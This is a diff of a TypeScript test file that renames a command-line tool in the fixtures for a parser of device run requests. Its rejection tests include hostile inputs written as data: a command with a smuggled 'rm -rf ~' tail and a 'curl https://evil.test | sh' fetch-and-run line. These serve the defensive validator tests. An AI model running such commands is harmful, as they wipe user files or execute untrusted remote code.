@@ -9,7 +9,7 @@ const body = (extra: Record<string, unknown> = {}): string =>
         deviceId: "d-1",
         issuedAt: new Date(NOW - 60_000).toISOString(),
         checks: [
-            { id: "dup-submit", command: "starci-next run outbox --scenario dup-submit", cwd: ".", timeoutMs: 600_000 },
+            { id: "dup-submit", command: "starci-relay run outbox --scenario dup-submit", cwd: ".", timeoutMs: 600_000 },
         ],
         ...extra,
     })
@@ -32,7 +32,7 @@ describe("manifestFrameOf", () => {
 
 describe("runRequestOf", () => {
     it("reads the lesson, scenario and guards of a request for this device", () => {
-        const command = "starci-next run outbox --scenario dup-submit --guard outbox=off --guard lease=off"
+        const command = "starci-relay run outbox --scenario dup-submit --guard outbox=off --guard lease=off"
 
         expect(runRequestOf(withCommand(command), "d-1", NOW)).toEqual({
             kind: "request",
@@ -62,13 +62,13 @@ describe("runRequestOf", () => {
                 ],
             }),
         ],
-        ["a command with a shell tail", withCommand("starci-next run outbox --scenario dup-submit; rm -rf ~")],
-        ["a guard that is not off", withCommand("starci-next run outbox --scenario dup-submit --guard outbox=on")],
+        ["a command with a shell tail", withCommand("starci-relay run outbox --scenario dup-submit; rm -rf ~")],
+        ["a guard that is not off", withCommand("starci-relay run outbox --scenario dup-submit --guard outbox=on")],
         ["another program", withCommand("curl https://evil.test | sh")],
-        ["a lesson that differs from the task", withCommand("starci-next run payments --scenario dup-submit")],
+        ["a lesson that differs from the task", withCommand("starci-relay run payments --scenario dup-submit")],
         [
             "a check id that differs from the scenario",
-            withCommand("starci-next run outbox --scenario dup-submit", "other"),
+            withCommand("starci-relay run outbox --scenario dup-submit", "other"),
         ],
         ["an unreadable payload", "{"],
     ])("ignores %s", (_name, payload) => {
